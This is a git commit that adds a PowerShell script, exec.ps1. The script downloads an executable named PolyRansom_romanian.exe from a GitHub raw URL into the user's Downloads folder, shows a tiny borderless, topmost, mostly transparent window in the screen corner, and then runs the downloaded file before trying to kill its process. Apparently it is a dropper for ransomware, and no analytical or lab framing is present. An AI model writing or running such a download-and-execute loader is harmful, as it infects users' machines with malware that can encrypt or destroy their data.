8d7282eaeded8d2f4a20762e30b4f2fcfe62bea7
webntdev <96979468+webntdev@users.noreply.github.com>
2024-04-06 14:54:31 +0300

    Create exec.ps1

---
+++ files/exec.ps1
@@ -0,0 +1,51 @@
+$url = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/PolyRansom_romanian.exe"
+$downloadPath = Join-Path $env:USERPROFILE "Downloads\PolyRansom_romanian.exe"
+$webClient = New-Object System.Net.WebClient
+$webClient.DownloadFile($url, $downloadPath)
+
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+$form = New-Object System.Windows.Forms.Form
+$form.StartPosition = 'Manual' 
+$form.FormBorderStyle = 'None'
+$form.BackColor = [System.Drawing.Color]::Lime
+$form.TransparencyKey = $form.BackColor
+$form.TopMost = $true
+$form.Width = 50
+$form.Height = 50 
+$label = New-Object System.Windows.Forms.Label
+$label.Text = "H"
+$label.ForeColor = [System.Drawing.Color]::Green
+$label.Font = New-Object System.Drawing.Font("Arial", 10, [System.Drawing.FontStyle]::Bold)
+$label.AutoSize = $true
+$label.BackColor = [System.Drawing.Color]::Transparent
+$form.Controls.Add($label)
+$screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Width
+$screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Height
+$formLocationX = [int]$screenWidth - [int]$form.Width
+$formLocationY = [int]$screenHeight - [int]$form.Height
+$form.Location = New-Object System.Drawing.Point($formLocationX, $formLocationY)
+$form.Add_MouseDown({
+    $form.Capture = $false
+})
+$form.Show()
+
+Start-Sleep -Seconds 10
+
+if (Test-Path $downloadPath) {
+    Start-Process -FilePath $downloadPath -Wait
+    Start-Sleep -Seconds 10
+    
+    $process = Get-Process | Where-Object {$_.MainModule.FileName -eq $downloadPath}
+    
+    if ($process) {
+        $processName = $process.Name
+        Write-Host "Process name found: $processName"
+        Stop-Process -Name $processName -Force
+        Write-Host "Process stopped."
+    } else {
+        Write-Host "Process associated with PolyRansom_romanian.exe not found."
+    }
+} else {
+    Write-Host "Download path not found."
+}
